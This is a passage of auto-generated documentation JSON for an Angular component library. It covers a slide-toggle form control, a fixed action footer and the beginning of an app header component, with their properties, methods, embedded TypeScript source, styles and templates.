          "modifierKind": [
            121
          ]
        },
        {
          "name": "autofilled",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 44
        },
        {
          "name": "controlType",
          "defaultValue": "'number-input'",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 45
        },
        {
          "name": "ctrl",
          "defaultValue": "new FormControl<boolean | null>(null)",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 46
        },
        {
          "name": "describedBy",
          "defaultValue": "''",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 51,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'attr.aria-describedby'"
            }
          ]
        },
        {
          "name": "focused",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 43
        },
        {
          "name": "id",
          "defaultValue": "`value-unit-input-${SlideToggleComponent.nextId++}`",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 49,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": ""
            }
          ]
        },
        {
          "name": "nextId",
          "defaultValue": "0",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 41,
          "modifierKind": [
            124
          ]
        },
        {
          "name": "ngControl",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "NgControl",
          "optional": false,
          "description": "",
          "line": 60,
          "decorators": [
            {
              "name": "Optional",
              "stringifiedArguments": ""
            },
            {
              "name": "Self",
              "stringifiedArguments": ""
            }
          ],
          "modifierKind": [
            123
          ]
        },
        {
          "name": "onChange",
          "defaultValue": "() => {...}",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 192
        },
        {
          "name": "onTouched",
          "defaultValue": "() => {...}",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 195
        },
        {
          "name": "placeholder",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 56
        },
        {
          "name": "slideToggle",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MatSlideToggle",
          "optional": false,
          "description": "",
          "line": 53,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "MatSlideToggle"
            }
          ]
        },
        {
          "name": "stateChanges",
          "defaultValue": "new Subject<void>()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 42
        },
        {
          "name": "sub",
          "defaultValue": "new Subscription()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 47,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 174,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 158,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onContainerClick",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 180,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "registerOnChange",
          "args": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 202,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "registerOnTouched",
          "args": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 206,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setDescribedByIds",
          "args": [
            {
              "name": "ids",
              "type": "string[]",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 187,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "ids",
              "type": "string[]",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setDisabledState",
          "args": [
            {
              "name": "isDisabled",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 210,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "isDisabled",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "writeValue",
          "args": [
            {
              "name": "value",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 198,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "attr.aria-describedby",
          "defaultValue": "''",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 51,
          "type": "string",
          "decorators": []
        },
        {
          "name": "class.floating",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 73,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "id",
          "defaultValue": "`value-unit-input-${SlideToggleComponent.nextId++}`",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 49,
          "type": "string",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  ChangeDetectionStrategy,\n  Component,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnDestroy,\n  OnInit,\n  Optional,\n  Output,\n  Self,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { ControlValueAccessor, FormControl, NgControl } from '@angular/forms';\nimport { MatFormFieldControl } from '@angular/material/form-field';\nimport { FocusMonitor } from '@angular/cdk/a11y';\nimport { Subject, Subscription } from 'rxjs';\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\nimport { ThemePalette } from '@angular/material/core';\nimport { MatSlideToggle } from '@angular/material/slide-toggle';\n\nexport class StoSlideToggleChange {\n  source: SlideToggleComponent;\n  checked: boolean;\n}\n\n@Component({\n  selector: 'sto-slide-toggle',\n  templateUrl: './slide-toggle.component.html',\n  styleUrls: [ './slide-toggle.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  providers: [\n    { provide: MatFormFieldControl, useExisting: SlideToggleComponent }\n  ]\n})\nexport class SlideToggleComponent implements OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<boolean> {\n  static nextId = 0;\n  stateChanges = new Subject<void>();\n  focused: boolean;\n  autofilled: boolean;\n  controlType = 'number-input';\n  ctrl = new FormControl<boolean | null>(null);\n  public sub = new Subscription();\n  @HostBinding()\n  id = `value-unit-input-${SlideToggleComponent.nextId++}`;\n  @HostBinding('attr.aria-describedby')\n  describedBy = '';\n  @ViewChild(MatSlideToggle)\n  slideToggle: MatSlideToggle;\n  @Output()\n  toggled = new EventEmitter<StoSlideToggleChange>();\n  placeholder: string; // Required by material control, but not used.\n  @Input()\n  model: unknown;\n\n  constructor(@Optional() @Self() public ngControl: NgControl,\n              private fm: FocusMonitor,\n              private elRef: ElementRef<HTMLElement>) {\n    if ( this.ngControl != null ) {\n      this.ngControl.valueAccessor = this;\n    }\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\n      this.focused = !!origin;\n      this.stateChanges.next();\n    });\n  }\n\n  @HostBinding('class.floating')\n  get shouldLabelFloat() {\n    return this.focused || !this.empty;\n  }\n\n  private _errorState: boolean;\n\n  get errorState() {\n    return this._errorState;\n  }\n\n  set errorState(errorState) {\n    this._errorState = errorState;\n    this.stateChanges.next();\n  }\n\n  private _disabled = false;\n\n  @Input()\n  get disabled(): boolean {\n    return this._disabled;\n  }\n\n  set disabled(value: boolean) {\n    this._disabled = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    this._disabled ? this.ctrl.disable(opts) : this.ctrl.enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _color: ThemePalette;\n\n  @Input()\n  get color(): ThemePalette {\n    return this._color || 'primary';\n  }\n\n  set color(color) {\n    this._color = color || 'primary';\n    this.stateChanges.next();\n  }\n\n  private _readonly = false;\n\n  @Input()\n  get readonly(): boolean {\n    return this._readonly;\n  }\n\n  set readonly(value: boolean) {\n    this._readonly = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    value ? this.ctrl.disable(opts) : this.ctrl.enable(opts);\n    this.stateChanges.next();\n  }\n\n  get empty() {\n    const value = this.ctrl.value;\n    return value === null || value === undefined;\n  }\n\n  private _required = false;\n\n  @Input()\n  get required() {\n    return this._required;\n  }\n\n  set required(req) {\n    this._required = coerceBooleanProperty(req);\n    this.stateChanges.next();\n  }\n\n  private _value: boolean | null;\n\n  @Input()\n  get value() {\n    return this._value;\n  }\n\n  set value(value) {\n    this._value = value;\n    this.ctrl.setValue(value, { emitEvent: false });\n    this.stateChanges.next();\n  }\n\n  ngOnInit(): void {\n    const sub = this.ctrl.valueChanges\n      .subscribe((value) => {\n        const event = new StoSlideToggleChange();\n        event.checked = value ?? false;\n        event.source = this;\n        this.toggled.emit(event);\n        this.onChange(value);\n      });\n    this.sub.add(sub);\n    if ( this.ngControl && this.ngControl.statusChanges ) {\n      this.sub.add(this.ngControl.statusChanges\n        .subscribe(state => this.errorState = state === 'INVALID'));\n    }\n  }\n\n  ngOnDestroy(): void {\n    this.stateChanges.complete();\n    this.fm.stopMonitoring(this.elRef.nativeElement);\n    this.sub.unsubscribe();\n  }\n\n  onContainerClick(event: MouseEvent): void {\n    if ( !this.disabled && !this.readonly ) {\n      this.slideToggle.focus();\n      this.ctrl.setValue(!this.ctrl.value);\n    }\n  }\n\n  setDescribedByIds(ids: string[]): void {\n    this.describedBy = ids.join(' ');\n  }\n\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\n  onChange = (_: unknown) => {\n  };\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\n  onTouched = () => {\n  };\n\n  writeValue(value: boolean): void {\n    this.value = value;\n  }\n\n  registerOnChange(fn: never): void {\n    this.onChange = fn;\n  }\n\n  registerOnTouched(fn: never): void {\n    this.onTouched = fn;\n  }\n\n  setDisabledState(isDisabled: boolean): void {\n    this.disabled = isDisabled;\n  }\n\n\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ".sto-slide-toggle {\n  display: grid;\n  grid-template-columns: 1fr min-content;\n\n  .sto-slide-toggle__toggler {\n    position: absolute;\n    top: -6px;\n    right: 4px;\n\n    &--hide {\n      display: none;\n    }\n  }\n}\n",
          "styleUrl": "./slide-toggle.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "ngControl",
            "type": "NgControl",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "fm",
            "type": "FocusMonitor",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "elRef",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 58,
        "jsdoctags": [
          {
            "name": "ngControl",
            "type": "NgControl",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "fm",
            "type": "FocusMonitor",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "elRef",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "OnInit",
        "OnDestroy",
        "ControlValueAccessor",
        "MatFormFieldControl"
      ],
      "accessors": {
        "shouldLabelFloat": {
          "name": "shouldLabelFloat",
          "getSignature": {
            "name": "shouldLabelFloat",
            "type": "",
            "returnType": "",
            "line": 73
          }
        },
        "errorState": {
          "name": "errorState",
          "setSignature": {
            "name": "errorState",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "errorState",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 83,
            "jsdoctags": [
              {
                "name": "errorState",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "errorState",
            "type": "",
            "returnType": "",
            "line": 79
          }
        },
        "disabled": {
          "name": "disabled",
          "setSignature": {
            "name": "disabled",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 95,
            "jsdoctags": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "disabled",
            "type": "boolean",
            "returnType": "boolean",
            "line": 91
          }
        },
        "color": {
          "name": "color",
          "setSignature": {
            "name": "color",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "color",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 109,
            "jsdoctags": [
              {
                "name": "color",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "color",
            "type": "",
            "returnType": "ThemePalette",
            "line": 105
          }
        },
        "readonly": {
          "name": "readonly",
          "setSignature": {
            "name": "readonly",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 121,
            "jsdoctags": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "readonly",
            "type": "boolean",
            "returnType": "boolean",
            "line": 117
          }
        },
        "empty": {
          "name": "empty",
          "getSignature": {
            "name": "empty",
            "type": "",
            "returnType": "",
            "line": 128
          }
        },
        "required": {
          "name": "required",
          "setSignature": {
            "name": "required",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "req",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 140,
            "jsdoctags": [
              {
                "name": "req",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "required",
            "type": "",
            "returnType": "",
            "line": 136
          }
        },
        "value": {
          "name": "value",
          "setSignature": {
            "name": "value",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "value",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 152,
            "jsdoctags": [
              {
                "name": "value",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "value",
            "type": "",
            "returnType": "",
            "line": 148
          }
        }
      },
      "templateData": "<div class=\"sto-slide-toggle\">\n  <span class=\"sto-slide-toggle__label\">{{ ctrl.value ? 'Yes' : 'No' }}</span>\n  <mat-slide-toggle (click)=\"$event.stopPropagation()\"\n                    class=\"sto-slide-toggle__toggler\"\n                    [class.sto-slide-toggle__toggler--hide]=\"readonly\"\n                    [formControl]=\"ctrl\"\n                    [color]=\"color\"></mat-slide-toggle>\n</div>\n"
    },
    {
      "name": "StoActionFooterComponent",
      "id": "component-StoActionFooterComponent-4850c60d984b4170baae2935e972a4caf24136e302c29937f50ff79f37ba23ff151dc00d6b89a4df67814c4d3366db2f9259e6ef34b17b359ac08aa65f74cec1",
      "file": "libs/common/src/lib/sto-action-footer/sto-action-footer.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-action-footer",
      "styleUrls": [
        "./sto-action-footer.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-action-footer.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "isLoading",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nTriggers if the progressbar should be visible or not.\n",
          "description": "<p>Triggers if the progressbar should be visible or not.</p>\n",
          "line": 22,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "position",
          "defaultValue": "'fixed'",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nHostbinds to style.position. Defaults to \"fixed\", but could be absolute inside a relative container.\n",
          "description": "<p>Hostbinds to style.position. Defaults to &quot;fixed&quot;, but could be absolute inside a relative container.</p>\n",
          "line": 33,
          "type": "string",
          "decorators": []
        },
        {
          "name": "shouldAddClass",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nIf a class \"sto-has-action-footer\" should be appended to the body-tag.\nThis is used to calculate correct height by adding padding to the body element as the footer is a fixed element.\nDefault true.\n",
          "description": "<p>If a class &quot;sto-has-action-footer&quot; should be appended to the body-tag.\nThis is used to calculate correct height by adding padding to the body element as the footer is a fixed element.\nDefault true.</p>\n",
          "line": 28,
          "type": "boolean",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "actionFooterClass",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 17,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-action-footer'"
            }
          ],
          "modifierKind": [
            121
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 38,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 44,
          "deprecated": false,
          "deprecationMessage": ""
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-action-footer",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 17,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "<p>The action footer is a fixed footer at the bottom of the viewport.\nShould be used with buttons with actions like &quot;Save, cancel etc.\nHas a built-in loading/progress bar.</p>\n",
      "rawdescription": "\n\nThe action footer is a fixed footer at the bottom of the viewport.\nShould be used with buttons with actions like \"Save, cancel etc.\nHas a built-in loading/progress bar.\n",
      "type": "component",
      "sourceCode": "import { ChangeDetectionStrategy, Component, HostBinding, Input, OnDestroy, OnInit, Renderer2, ViewEncapsulation } from '@angular/core';\n\n/**\n * The action footer is a fixed footer at the bottom of the viewport.\n * Should be used with buttons with actions like \"Save, cancel etc.\n * Has a built-in loading/progress bar.\n */\n@Component({\n  selector: 'sto-action-footer',\n  templateUrl: './sto-action-footer.component.html',\n  styleUrls : ['./sto-action-footer.component.scss'],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class StoActionFooterComponent implements OnInit, OnDestroy  {\n  @HostBinding('class.sto-action-footer')\n  private actionFooterClass = true;\n\n  /**\n   * Triggers if the progressbar should be visible or not.\n   */\n  @Input() isLoading: boolean;\n  /**\n   * If a class \"sto-has-action-footer\" should be appended to the body-tag.\n   * This is used to calculate correct height by adding padding to the body element as the footer is a fixed element.\n   * Default true.\n   */\n  @Input() shouldAddClass = true;\n\n  /**\n   * Hostbinds to style.position. Defaults to \"fixed\", but could be absolute inside a relative container.\n   */\n  @HostBinding('style.position') @Input() position = 'fixed';\n\n  constructor(private renderer: Renderer2) {\n  }\n\n  ngOnDestroy(): void {\n    if ( this.shouldAddClass ) {\n      this.renderer.removeClass(document.body, 'sto-has-action-footer');\n    }\n  }\n\n  ngOnInit(): void {\n    if ( this.shouldAddClass ) {\n      this.renderer.addClass(document.body, 'sto-has-action-footer');\n    }\n  }\n\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "@use '@angular/material' as mat;\n\n$footer-height: 69px;\n\n.sto-action-footer {\n\n  bottom: 0;\n  left: 0;\n  width: 100%;\n  height: $footer-height;\n  min-height: $footer-height;\n  z-index: 25;\n\n  button {\n  }\n\n  &__message {\n    line-height: 2.9;\n  }\n\n  &__content {\n    padding: 16px 24px;\n  }\n\n  .mat-progress-bar {\n    margin-top: -5px;\n  }\n\n}\n\n.sto-has-action-footer{\n  padding-bottom: $footer-height;\n}\n\n",
          "styleUrl": "./sto-action-footer.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "renderer",
            "type": "Renderer2",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 33,
        "jsdoctags": [
          {
            "name": "renderer",
            "type": "Renderer2",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "OnInit",
        "OnDestroy"
      ],
      "readme": "<h4 id=\"sto-action-footer\">Sto action footer</h4>\n<p>The action footer is a fixed footer at the bottom of the viewport.\nShould be used with buttons with actions like &quot;Save, cancel etc.\nHas a built-in loading/progress bar.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer [isLoading]=&quot;$isloading | async&quot;&gt;\n    &lt;button (click)=&quot;onClick()&quot;&gt;Submit&lt;/button&gt;\n    &lt;button (click)=&quot;cancel()&quot;&gt;Cancel&lt;/button&gt;\n&lt;/sto-action-footer&gt;</code></pre></div><h5 id=\"isloading\">isLoading</h5>\n<p>Triggers if the progressbar should be visible or not.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer [isLoading]=&quot;true&quot;&gt;&lt;/sto-action-footer&gt; </code></pre></div><h5 id=\"shouldaddclass\">shouldAddClass</h5>\n<p>If a class &quot;sto-has-action-footer&quot; should be appended to the body-tag.<br>This is used to calculate correct height by adding padding to the body element as the footer is a fixed element.<br>Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer [shouldAddClass]=&quot;false&quot;&gt;&lt;/sto-action-footer&gt; </code></pre></div><h5 id=\"position\">position</h5>\n<p>Hostbinds to style.position. Defaults to &quot;fixed&quot;, but could be absolute inside a relative container.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer position=&quot;absolute&quot; [shouldAddClass]=&quot;false&quot;&gt;&lt;/sto-action-footer&gt; </code></pre></div>",
      "templateData": "<mat-progress-bar\n\t\t*ngIf=\"isLoading\"\n\t\tcolor=\"primary\"\n\t\tmode=\"indeterminate\"\n\n></mat-progress-bar>\n<div class=\"sto-action-footer__content\">\n\t<ng-content></ng-content>\n</div>\n"
    },
    {
      "name": "StoAppHeaderComponent",
      "id": "component-StoAppHeaderComponent-162e9955bff92b29d1bb041d7d039b21af6323a0ea338d43b3fb8def48188771ad964c5adf1eb8114f249f565f395ccf1e6febcfdcf922ccc182613733d544d6",
      "file": "libs/common/src/lib/sto-app-header/sto-app-header.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-app-header",
      "styleUrls": [
        "./sto-app-header.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-app-header.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "breadCrumbs",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nConfiguration used to print out the relevant application breadcrumbs.\n",
          "description": "<p>Configuration used to print out the relevant application breadcrumbs.</p>\n",
          "line": 51,
          "type": "Breadcrumb[]",
          "decorators": []
        },
        {
          "name": "environmentName",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nIf {@link testEnvironment} is true, this name is printed out centered on the header\n",
          "description": "<p>If {@link testEnvironment} is true, this name is printed out centered on the header</p>\n",
          "line": 36,
          "type": "string",
          "decorators": []
        },
        {
          "name": "homeBreadCrumbConfig",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nConfiguration that determines what to do when clicking the top-level menu icon\n",
          "description": "<p>Configuration that determines what to do when clicking the top-level menu icon</p>\n",
          "line": 46,
          "type": "literal type",
          "decorators": []
        },
        {
          "name": "testEnvironment",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\ntestEnvironment tells the header whether or not to style itself defining a test-environment\n",
          "description": "<p>testEnvironment tells the header whether or not to style itself defining a test-environment</p>\n",
          "line": 31,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "userMenu",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nInput for user information menu.\n",
          "description": "<p>Input for user information menu.</p>\n",
          "line": 41,
          "type": "MatMenuPanel",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "darkmode$",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Observable<boolean>",
          "optional": false,
          "description": "",
          "line": 53,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "isSmall$",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Observable<boolean>",
          "optional": false,
          "description": "",
          "line": 54,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "menuOpen",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 55,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 107,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "toggleMenu",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 76,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "toggleTheme",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 64,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "toggleTypography",
          "args": [
            {
              "name": "className",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 69,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "className",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "optional": true,
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "<p>StoAppHeaderComponent is used to create an App header toolbar with a common look / feel across our portfolio</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\"></code></pre></div><p>&lt;sto-app-header [homeBreadCrumbConfig]=&quot;{ command: () =&gt; openDrawer() }&quot;\n   [breadCrumbs]=&quot;[{ label: &#39;Planning&#39;, segment: &#39;planning&#39; }]&quot;&gt;\n</sto-app-header></p>\n",
      "rawdescription": "\n\nStoAppHeaderComponent is used to create an App header toolbar with a common look / feel across our portfolio\n\n```html\n```\n<sto-app-header [homeBreadCrumbConfig]=\"{ command: () => openDrawer() }\"\n   [breadCrumbs]=\"[{ label: 'Planning', segment: 'planning' }]\">\n</sto-app-header>\n",
      "type": "component",
